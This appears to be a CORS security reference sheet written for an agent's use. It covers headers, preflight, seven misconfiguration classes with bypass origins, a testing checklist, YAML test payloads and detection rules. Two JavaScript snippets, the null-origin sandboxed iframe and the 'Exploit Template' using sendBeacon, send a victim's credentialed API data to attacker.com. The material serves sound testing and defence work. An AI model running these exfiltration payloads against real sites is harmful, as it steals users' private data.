---
topic: CORS
category: web-security
tags: [cors, sop, cross-origin, headers, preflight, credentials]
agent_use: true
---

# CORS (Cross-Origin Resource Sharing)

## Concept

- **SOP**: allows sending cross-origin requests, blocks reading responses
- **CORS**: server-controlled mechanism to selectively allow reading cross-origin responses
- Browser enforces CORS; server only declares rules

---

## Headers Reference

| Header | Purpose | Notes |
|--------|---------|-------|
| `Access-Control-Allow-Origin` | Allowed origin(s) | `*` or specific origin |
| `Access-Control-Allow-Credentials` | Allow cookies/auth | Cannot combine with `*` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | |
| `Access-Control-Allow-Headers` | Allowed custom headers | |
| `Access-Control-Max-Age` | Preflight cache duration (seconds) | |

---

## Preflight (OPTIONS) Request

**Triggers preflight** (non-simple request):
- Methods: `PUT`, `DELETE`, `PATCH`
- Headers: `Authorization`, custom headers
- Content-Type: `application/json`

**Simple request** (no preflight):
- Methods: `GET`, `POST`, `HEAD`
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

**Flow:**

```http
OPTIONS /endpoint HTTP/1.1
Origin: https://site.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization

HTTP/1.1 204
Access-Control-Allow-Origin: https://site.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Authorization
```

---

## CORS vs Forms

| | Form | Fetch/XHR |
|-|------|-----------|
| Sends request | yes | yes |
| Uses CORS | no | yes |
| Reads response | no | yes |

Forms bypass CORS — reason CSRF exists separately.

---

## Vulnerabilities

### V1 — Origin Reflection
**Pattern:** Server echoes back whatever origin is sent.
**Detection:** Send arbitrary `Origin:` header, check if reflected in `Access-Control-Allow-Origin`.
**Condition for exploit:** `Access-Control-Allow-Credentials: true` also present.

```http
GET /api/data HTTP/1.1
Origin: https://evil.com

# Vulnerable response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

---

### V2 — Wildcard with Credentials
**Pattern:** `ACAO: *` combined with `ACAC: true`.
**Note:** Browsers reject this combo, but indicates misconfiguration.

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

---

### V3 — Whitelist Bypass (Substring Match)
**Pattern:** Server validates origin using `endsWith` or `contains`.

**Bypass payloads:**
```
evil-example.com        # endsWith("example.com") passes
example.com.evil.com    # contains("example.com") passes
```

---

### V4 — Regex Mistakes
**Pattern:** Loose regex allows prefix/suffix injection.
**Vulnerable regex:** `.*example\.com`

**Bypass payloads:**
```
attackerexample.com
example.com.evil.com
```

---

### V5 — Trusted Subdomain
**Pattern:** Server trusts `*.example.com` but attacker controls a subdomain via XSS or takeover.
**Condition:** Attacker controls any subdomain of the trusted domain.

---

### V6 — Null Origin Whitelist
**Pattern:** Server allows `Origin: null` with credentials.
**Exploit trigger:** Sandboxed iframe forces `Origin: null`.

```html
<iframe sandbox="allow-scripts allow-forms"
  src="data:text/html,<script>
    fetch('https://victim.com/api',{credentials:'include'})
      .then(r=>r.text())
      .then(d=>top.location='https://attacker.com/?d='+btoa(d))
  </script>">
</iframe>
```

---

### V7 — Overly Permissive Headers / Methods

```http
Access-Control-Allow-Headers: *
Access-Control-Allow-Methods: PUT, DELETE
```

- `*` on headers: attacker can send `Authorization`, internal headers
- Dangerous methods enabled cross-origin

---

## Exploit Template

**Requirements:** attacker origin reflected + `Access-Control-Allow-Credentials: true`

```javascript
fetch("https://victim.com/api/account", {
  credentials: "include"
})
.then(r => r.text())
.then(data => {
  navigator.sendBeacon("https://attacker.com/log", data);
});
```

---

## Testing Checklist

```
[ ] 1. Send arbitrary Origin header — check if reflected in ACAO response
[ ] 2. Check for Access-Control-Allow-Credentials: true alongside reflection
[ ] 3. Send Origin: null — check if ACAO returns "null" with credentials
[ ] 4. Test whitelist bypass: evil-<domain>, <domain>.evil.com
[ ] 5. Test regex bypass: attacker<domain>, <domain>.attacker.com
[ ] 6. Check if wildcard (*) is combined with credentials header
[ ] 7. Check Access-Control-Allow-Headers and Allow-Methods for over-permission
[ ] 8. Identify subdomain takeover candidates for trusted wildcard origins
```

---

## Automated Test Payloads

```yaml
target_header: Origin
tests:
  - id: reflect-test
    payload: "https://evil-cors-test.com"
    pass_if: response.headers["Access-Control-Allow-Origin"] == payload

  - id: null-origin
    payload: "null"
    pass_if: response.headers["Access-Control-Allow-Origin"] == "null"

  - id: prefix-bypass
    template: "https://evil{domain}"
    pass_if: response.headers["Access-Control-Allow-Origin"] contains domain

  - id: suffix-bypass
    template: "https://{domain}.evil.com"
    pass_if: response.headers["Access-Control-Allow-Origin"] contains domain

  - id: credentials-wildcard
    check: |
      response.headers["Access-Control-Allow-Origin"] == "*"
      AND response.headers["Access-Control-Allow-Credentials"] == "true"
    severity: high
```

---

## Detection Rules

```yaml
rules:
  - id: cors-reflect
    severity: critical
    condition: |
      request.header["Origin"] == response.header["Access-Control-Allow-Origin"]
      AND response.header["Access-Control-Allow-Credentials"] == "true"
    description: Origin reflection with credentials — full data exfiltration possible

  - id: cors-null-creds
    severity: high
    condition: |
      response.header["Access-Control-Allow-Origin"] == "null"
      AND response.header["Access-Control-Allow-Credentials"] == "true"
    description: Null origin trusted with credentials

  - id: cors-wildcard-creds
    severity: medium
    condition: |
      response.header["Access-Control-Allow-Origin"] == "*"
      AND response.header["Access-Control-Allow-Credentials"] == "true"
    description: Browser blocks this, but indicates server misconfiguration

  - id: cors-permissive-methods
    severity: medium
    condition: |
      response.header["Access-Control-Allow-Methods"] contains ["DELETE","PUT","PATCH"]
      AND response.header["Access-Control-Allow-Origin"] != expected_origin
    description: Dangerous methods exposed cross-origin
```

---

## Key Invariants

- CORS != CSRF protection (CORS protects reading; CSRF abuses writing/actions)
- Browser enforces CORS — server only hints
- Credentials + permissive origin = critical severity
- Reflected ACAO without credentials = low/info severity
